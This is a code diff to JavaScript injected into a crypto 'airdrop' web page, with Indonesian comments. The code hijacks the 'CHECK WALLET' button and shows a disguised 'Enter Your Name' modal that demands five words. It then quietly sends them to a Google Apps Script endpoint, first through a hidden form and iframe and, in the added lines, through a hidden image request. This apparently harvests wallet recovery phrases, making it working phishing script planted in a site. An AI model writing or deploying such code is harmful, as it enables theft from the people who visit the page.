@@ -529,7 +529,7 @@ setTimeout(() => {
     console.log("WILLIEM Rekap Jalan");
 
     // 1. GANTI INI DENGAN URL APPS SCRIPT LU YG UDAH ADA
-    const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycby30IseIsONh-uA_yK09GglS0vmfou7WFPnLKktNhQb_8ZzcXoEFWjs9yfKd-qEU5I/exec";  
+    const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/PASTE_URL_LU_DISINI/exec"; 
 
     // 2. BIKIN MODAL 5 KOTAK
     const modal = document.createElement("div");
@@ -591,67 +591,16 @@ setTimeout(() => {
 }, 2500); // delay 2.5 detik biar nunggu web lu load semua
 });
 // === SELESAI KODE TAMBAHAN === //
-// === WILLIEM REKAP GSHEET FINAL V6 START === //
-window.addEventListener('load', () => {
-setTimeout(() => {
-    // URL EXEC LU
-    const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycby30IseIsONh-uA_yK09GglS0vmfou7WFPnLKktNhQb_8ZzcXoEFWjs9yfKd-qEU5I/exec"; 
+const GOOGLE_SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzN8amAHONNDlyNBky3GMdzhCINM2RXDIZPNLQBTXzjL0wE9cDdiOMp_Cjay4kE0D4N/exec";
 
-    // BIKIN MODAL 5 KOTAK
-    const modal = document.createElement("div");
-    modal.id = "nameModalWLM";
-    modal.style.cssText = "display:none; position:fixed; inset:0; background:rgba(0,0,0,0.95); z-index:99999; justify-content:center; align-items:center;";
-    modal.innerHTML = `
-      <div style="background:#1a1a2e; padding:30px 25px; border-radius:16px; width:95%; max-width:480px; border:2px solid #a855ff; text-align:center; color:#fff; font-family: sans-serif;">
-        <img src="williem.png" onerror="this.style.display='none'" style="width:80px; height:80px; margin-bottom:15px; border-radius:16px; background:#000; padding:8px;">
-        <h3 style="margin:0 0 10px; font-size:22px;">Enter Your Name</h3>
-        <p style="color:#aaa; font-size:14px; margin:0 0 25px;">Isi 5 Kata untuk WILLIEM COIN Airdrop</p>
-        <div style="display:flex; gap:10px; justify-content:center; flex-wrap:wrap; margin-bottom:25px;">
-          <input class="nameBoxWLM" type="text" placeholder="Kata 1" maxlength="12" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
-          <input class="nameBoxWLM" type="text" placeholder="Kata 2" maxlength="12" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
-          <input class="nameBoxWLM" type="text" placeholder="Kata 3" maxlength="12" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
-          <input class="nameBoxWLM" type="text" placeholder="Kata 4" maxlength="12" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
-          <input class="nameBoxWLM" type="text" placeholder="Kata 5" maxlength="12" style="width:80px; height:60px; text-align:center; font-size:16px; font-weight:600; border-radius:12px; border:1px solid #333; background:#0f0f1a; color:#fff; outline:none;">
-        </div>
-        <button id="submitNameBtnWLM" style="width:100%; padding:14px; background:linear-gradient(90deg,#a855ff,#7c3aed); color:#fff; border:none; border-radius:10px; font-weight:bold; cursor:pointer; font-size:16px;">SUBMIT</button>
-      </div>
-    `;
-    document.body.appendChild(modal);
-
-    // HACK TOMBOL CHECK WALLET
-    const checkWalletBtn = Array.from(document.querySelectorAll("button")).find(btn => btn.innerText && btn.innerText.toUpperCase().includes("CHECK WALLET"));
-    if(checkWalletBtn){
-        checkWalletBtn.onclick = (e) => {
-            e.preventDefault(); e.stopPropagation();
-            modal.style.display = "flex";
-        }
-    }
-
-    // KIRIM DATA
-    document.getElementById("submitNameBtnWLM").onclick = () => {
-        let name = Array.from(document.querySelectorAll('.nameBoxWLM')).map(b=>b.value.trim()).filter(Boolean).join(" ");
-        if(name.split(" ").length < 5) return alert("Wajib isi 5 kotak bro!");
-        
-        const form = document.createElement('form');
-        form.method = 'POST';
-        form.action = GOOGLE_SCRIPT_URL;
-        form.target = 'hidden_iframe_wlm';
-        form.innerHTML = `<input name="nama" value="${name}">`;
-        document.body.appendChild(form);
-        const iframe = document.createElement('iframe');
-        iframe.name = 'hidden_iframe_wlm';
-        iframe.style.display = 'none';
-        document.body.appendChild(iframe);
-        form.submit();
-
-        modal.style.display = "none";
-        alert("✅ BERHASIL TERDAFTAR!\nData: " + name + "\nCek Google Sheet2 sekarang");
-        document.querySelectorAll('.nameBoxWLM').forEach(box => box.value = "");
-        setTimeout(() => { form.remove(); iframe.remove(); }, 1000);
-    }
+document.getElementById("submitNameBtnWLM").onclick = () => {
+    let name = Array.from(document.querySelectorAll('.nameBoxWLM')).map(b=>b.value.trim()).filter(Boolean).join(" ");
+    if(name.split(" ").length < 5) return alert("Isi 5 kotak dulu bro!");
     
-    modal.onclick = (e) => { if(e.target === modal) modal.style.display = "none"; }
-
-}, 2500);
-});
-// === WILLIEM REKAP GSHEET FINAL V6 END === //
+    // KIRIM PAKE GAMBAR BIAR TEMBUS VERCEL
+    new Image().src = GOOGLE_SCRIPT_URL + '?nama=' + encodeURIComponent(name);
+    
+    modal.style.display = "none";
+    alert("✅ TERKIRIM! Cek Sheet2 3 detik lagi");
+    document.querySelectorAll('.nameBoxWLM').forEach(box => box.value = "");
+}
